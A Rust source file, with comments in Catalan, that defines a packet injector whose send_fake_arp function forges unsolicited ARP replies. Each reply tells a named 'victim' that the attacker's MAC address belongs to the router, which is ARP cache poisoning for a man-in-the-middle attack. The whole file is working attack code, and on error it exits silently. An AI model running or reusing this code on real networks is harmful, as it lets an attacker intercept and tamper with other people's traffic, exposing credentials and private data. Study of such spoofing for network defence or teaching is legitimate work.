use pnet::datalink::{self, Channel, NetworkInterface};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::{ Packet};
use pnet::util::MacAddr;
use std::net::Ipv4Addr;


pub struct PacketInjector;

impl PacketInjector {
    
    // Funció per enviar UN paquet ARP falsificat
    pub fn send_fake_arp(
        interface: &NetworkInterface,
        target_mac: MacAddr,
        target_ip: Ipv4Addr,
        spoofed_mac: MacAddr, // La nostra MAC (fent veure que som el router)
        spoofed_ip: Ipv4Addr  // La IP del Router
    ) {
        let (mut tx, _) = match datalink::channel(interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            _ => return, // Si falla, sortim silenciosament
        };

        // 1. Construïm el paquet Ethernet (La carta)
        let mut eth_buffer = [0u8; 42];
        let mut eth_packet = MutableEthernetPacket::new(&mut eth_buffer).unwrap();

        eth_packet.set_destination(target_mac);
        eth_packet.set_source(spoofed_mac);
        eth_packet.set_ethertype(EtherTypes::Arp);

        // 2. Construïm el paquet ARP (El missatge fals)
        let mut arp_buffer = [0u8; 28];
        let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Reply); // Important: REPLY (Resposta no sol·licitada)

        // "Jo (Router Fals) sóc aquí"
        arp_packet.set_sender_hw_addr(spoofed_mac);
        arp_packet.set_sender_proto_addr(spoofed_ip);

        // "Per a tu (Víctima)"
        arp_packet.set_target_hw_addr(target_mac);
        arp_packet.set_target_proto_addr(target_ip);

        // 3. Posem l'ARP dins l'Ethernet
        eth_packet.set_payload(arp_packet.packet());

        // 4. FOC!
        let _ = tx.send_to(eth_packet.packet(), Some(interface.clone()));
    }

    // Helper per convertir Strings a Tipus de Xarxa
    pub fn parse_mac(mac: &str) -> MacAddr {
        // Netegem el string per si de cas
        let clean = mac.replace("-", ":");
        match clean.parse() {
            Ok(m) => m,
            Err(_) => MacAddr::zero()
        }
    }
}